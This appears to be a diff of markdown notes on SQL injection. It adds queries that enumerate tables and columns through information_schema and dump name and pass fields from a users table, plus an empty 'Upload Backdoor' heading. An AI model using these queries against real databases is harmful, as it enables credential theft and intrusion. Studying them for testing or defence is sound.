@@ -51,13 +51,13 @@ This Error Show
 * Exact syntax caused error = single quote
 * Where error occured = after the parameter value
 * 
-## 3. Enumearting Database
+## 3. Enumearte data from Database
 
 ![SQL Flow Chart](../photo/sqli4.png)
 
 
 
-## Finding Table Name
+#### Finding Table Name
 
 ```
 SELECT GROUP_CONCAT(table_name)
@@ -65,10 +65,19 @@ FROM information_schema.tables
 WHERE table_schema=database()
 ```
 
-## Finding Column Name
+#### Finding Column Name
 
 ```
 (SELECT GROUP_CONCAT(column_name)
 FROM information_schema.columns 
 WHERE table_name='users')
 ```
+
+#### Emeurate all data
+
+```
+SELECT GROUP_CONCAT(name,pass) FROM users
+```
+
+
+## 5.Upload Backdoor ???
